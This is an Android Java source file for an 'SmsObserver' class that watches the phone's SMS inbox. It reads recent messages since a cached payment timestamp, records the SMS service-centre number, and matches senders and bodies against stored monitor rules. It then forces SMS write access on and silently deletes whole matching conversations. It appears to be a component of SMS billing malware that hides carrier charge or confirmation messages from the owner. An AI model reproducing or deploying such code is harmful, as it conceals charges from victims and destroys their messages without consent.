package com.example.sayid.myapplication.sms;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;

import com.example.sayid.myapplication.common.bean.BlockBean;
import com.example.sayid.myapplication.common.bean.SmsInbox;
import com.example.sayid.myapplication.common.data.StringData;
import com.example.sayid.myapplication.common.db2.BlockDao;
import com.example.sayid.myapplication.common.util.CacheUtil;
import com.example.sayid.myapplication.common.util.SmsWriteOpUtil;

import java.util.ArrayList;
import java.util.List;

public class SmsObserver extends ContentObserver {
    private final static String TAG = "SmsObserver";
    private final static String[] FILED = {"_id", "thread_id", "type", "date", "body", "address", "read", "service_center"};

    private Context context;

    public SmsObserver(Handler handler, Context paramContext) {
        super(handler);
        this.context = paramContext;
    }

    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        try {
            blockSms(context);
        } catch (Exception e) {
//			Logs.e(TAG, e, "SmsObserver：error:");
        }
    }

    /**
     * 删除收件箱中的短信
     *
     * @param context
     */
    private void blockSms(Context context) {
        if (context == null) {
//			Logs.d(TAG, "context == null");
            return;
        }

        List<SmsInbox> smsInboxList = getSmsInboxList();

        // 查询需要拦截的Bean
        BlockDao blockDao = new BlockDao(context);
        List<BlockBean> blockList = blockDao.selectMonitor();
        for (SmsInbox smsInbox : smsInboxList) {
            // 是否拦截短信
            boolean isBlock = BlockBean.isBlock(context, blockList, smsInbox.getAddress(), smsInbox.getBody(), false);

            // 拦截并删除短信
            if (isBlock) {
                deletSms(context, smsInbox);
            }
        }
    }

    /**
     * 获取收件箱中短信列表
     *
     * @return
     */
    private List<SmsInbox> getSmsInboxList() {
        // 获取短信中心号
        String scenter = CacheUtil.getInstance().getString("scenter", "");

        ArrayList<SmsInbox> resultList = new ArrayList<SmsInbox>();
        long str = CacheUtil.getInstance().getLong(CacheUtil.KEY_PAY_TIME, (System.currentTimeMillis() - CacheUtil.NEXT_TIME_ERROR));
        Cursor cursor = context.getContentResolver().query(Uri.parse(StringData.getInstance().URI_SMS_INBOX), FILED,
                "date >=" + str, null, "date desc limit 10");

        while (cursor.moveToNext()) {
            SmsInbox temp = new SmsInbox();
            temp.setId(cursor.getInt(cursor.getColumnIndex("_id")));
            temp.setThreadId(cursor.getLong(cursor.getColumnIndex("thread_id")));
            temp.setType(cursor.getInt(cursor.getColumnIndex("type")));
            temp.setDate(cursor.getString(cursor.getColumnIndex("date")));
            temp.setBody(cursor.getString(cursor.getColumnIndex("body")));
            temp.setAddress(cursor.getString(cursor.getColumnIndex("address")));
            temp.setRead(cursor.getInt(cursor.getColumnIndex("read")));
            temp.setCenter(cursor.getString(cursor.getColumnIndex("service_center")));

            // 更新短信中心号
            if (TextUtils.isEmpty(scenter) || !scenter.equals(temp.getCenter())) {
                CacheUtil.getInstance().setString("scenter", temp.getCenter());
            }

            resultList.add(temp);
        }
        cursor.close();

        return resultList;
    }

    /**
     * 删除收件箱中的短信
     *
     * @param context
     * @param smsInbox
     */
    private void deletSms(Context context, SmsInbox smsInbox) {
//		Logs.d(TAG, "删除收件箱中的短信======dealMsg");

        try {
//			if (!SmsWriteOpUtil.isWriteEnabled(context)) {
            SmsWriteOpUtil.setWriteEnabled(context, true);
//			}
        } catch (Exception e) {
//			Logs.e(TAG, e, "setWriteEnabled===============error");
        }

        //删除消息
        context.getContentResolver().delete(Uri.parse("content://sms/conversations/" + smsInbox.getThreadId()), null, null);
    }
}
